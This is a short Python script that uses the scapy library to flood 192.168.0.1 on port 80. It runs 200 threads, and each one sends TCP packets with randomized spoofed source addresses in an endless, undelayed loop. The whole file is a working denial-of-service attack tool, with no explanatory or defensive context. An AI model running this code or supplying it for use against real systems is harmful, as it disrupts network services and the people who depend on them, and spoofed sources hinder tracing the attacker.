from scapy.all import *
import threading
def flood():
    pacote = IP(src=RandIP("*.*.*.*"), dst="192.168.0.1") / TCP(dport=80)
    send(pacote, loop=1, inter=0)


for x in range(200):
    threading.Thread(target=flood).start()

